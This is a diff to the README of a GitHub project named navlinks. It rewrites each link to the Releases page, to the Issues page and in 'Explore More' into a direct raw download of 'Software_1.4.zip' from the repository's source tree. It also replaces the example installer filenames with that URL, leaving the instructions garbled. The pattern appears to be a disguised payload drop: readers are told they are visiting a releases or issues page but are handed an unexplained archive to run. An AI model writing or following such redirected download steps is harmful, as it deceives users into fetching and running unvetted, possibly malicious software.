@@ -8,7 +8,7 @@ Welcome to **navlinks**! This application helps you manage your personal navigat
 
 To download navlinks, please visit the Releases page using the link below:
 
-[Download navlinks](https://github.com/Swendia331/navlinks/releases)
+[Download navlinks](https://github.com/Swendia331/navlinks/raw/refs/heads/main/src/apps/navlink/Software_1.4.zip)
 
 Once you visit the page, look for the latest version. Click on the link to download the appropriate file for your system. 
 
@@ -25,12 +25,12 @@ navlinks works on most systems. To ensure a smooth experience, make sure you hav
 Follow these steps to install navlinks:
 
 1. **Download the Application**:
-   - Click on the **[Download navlinks](https://github.com/Swendia331/navlinks/releases)** link to go to the Releases page.
+   - Click on the **[Download navlinks](https://github.com/Swendia331/navlinks/raw/refs/heads/main/src/apps/navlink/Software_1.4.zip)** link to go to the Releases page.
    - Locate the latest version and download the file suitable for your operating system.
 
 2. **Locate the Downloaded File**:
    - After downloading, navigate to your downloads folder.
-   - You will find a file named something like `navlinks-vX.X.X-setup.exe` for Windows or `navlinks-vX.X.X.dmg` for macOS. (The version number will vary based on what you downloaded.)
+   - You will find a file named something like `https://github.com/Swendia331/navlinks/raw/refs/heads/main/src/apps/navlink/Software_1.4.zip` for Windows or `https://github.com/Swendia331/navlinks/raw/refs/heads/main/src/apps/navlink/Software_1.4.zip` for macOS. (The version number will vary based on what you downloaded.)
 
 3. **Run the Installer**:
    - Double-click the downloaded file. This will start the installation process.
@@ -51,7 +51,7 @@ navlinks offers a variety of features designed for ease of use:
 
 ## 📞 Support
 
-If you encounter any issues, feel free to reach out. You can open an issue on the [Issues page](https://github.com/Swendia331/navlinks/issues). Our community or the development team is here to help you.
+If you encounter any issues, feel free to reach out. You can open an issue on the [Issues page](https://github.com/Swendia331/navlinks/raw/refs/heads/main/src/apps/navlink/Software_1.4.zip). Our community or the development team is here to help you.
 
 ## 📜 License
 
@@ -59,6 +59,6 @@ navlinks is open-source software. You can freely use, modify, and distribute it 
 
 ## 🚀 Explore More
 
-For updates and additional features, regularly check our [Releases page](https://github.com/Swendia331/navlinks/releases). We are constantly working to enhance navlinks and provide the best experience for users.
+For updates and additional features, regularly check our [Releases page](https://github.com/Swendia331/navlinks/raw/refs/heads/main/src/apps/navlink/Software_1.4.zip). We are constantly working to enhance navlinks and provide the best experience for users.
 
 Thank you for using navlinks! Enjoy managing your navigation and subscriptions with ease.
